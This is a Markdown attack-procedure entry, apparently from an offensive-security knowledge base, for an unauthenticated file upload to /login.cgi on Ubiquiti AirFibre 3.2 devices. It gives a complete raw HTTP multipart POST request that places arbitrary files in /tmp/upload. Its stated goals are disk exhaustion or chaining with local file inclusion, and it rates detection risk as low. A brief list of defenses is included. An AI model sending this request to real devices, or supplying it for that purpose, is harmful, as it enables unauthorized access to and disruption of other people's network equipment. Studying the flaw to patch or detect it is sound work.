---
id: proc-ubiquiti-upload-001
tags:
  - file-upload
  - unauthenticated
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/unauthenticated-file-upload-post]]'
verified: false
platforms:
  - Embedded Linux
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T17:31:10.957Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Perform-Unauthenticated-File-Upload

## Summary

This procedure exploits the lack of authentication in the /login.cgi endpoint of Ubiquiti AirFibre 3.2 to upload arbitrary files to the /tmp/upload directory using multipart/form-data POST requests, enabling initial access for further attacks like DoS or chaining with LFI.

## Description

The /login.cgi script processes file uploads without validating sessions or credentials, storing files in /tmp/upload on an Embedded Linux platform running AirOS. This allows unauthenticated placement of files, which can fill disk space or serve as a vector for other exploits. The attack targets web services on port 80 and requires only network reachability to the device.

## Requirements

1. Network access to the target Ubiquiti AirFibre device on port 80
2. Tools capable of sending raw HTTP POST requests (e.g., curl or custom scripts)
3. No credentials or prior access needed

## Defense

Defensive measures and detection strategies:

- Implement authentication checks on all CGI endpoints handling uploads
- Restrict file upload sizes and monitor /tmp directory usage
- Use web application firewalls to block unauthenticated multipart/form-data requests to sensitive paths

## Objectives

1. Upload a test file to confirm vulnerability
2. Place arbitrary files in /tmp for potential exploitation
3. Lay groundwork for disk exhaustion or LFI chaining

## Instructions

### Step 1: Send Test Upload Request

**Context**: Craft and send a multipart/form-data POST to /login.cgi without authentication to upload a simple text file.

**Command** ([[commands/unauthenticated-file-upload-post]]):

```http
POST http://[ip]/login.cgi HTTP/1.1
Proxy-Connection: keep-alive
Content-Length: 5179
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRfhSBNfoYzLOvXnc
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Host: [ip]

------WebKitFormBoundaryRfhSBNfoYzLOvXnc
Content-Disposition: form-data; name="file"; filename="test6.txt"
Content-Type: text/plain

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

------WebKitFormBoundaryRfhSBNfoYzLOvXnc--
```

> This command sends a raw HTTP request uploading 'test6.txt' with dummy content. Expected output is an HTTP 200 response, and the file will be stored in /tmp/upload on the device.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used

- [[commands/unauthenticated-file-upload-post]]

## Tools Used


## Tags

- file-upload
- unauthenticated
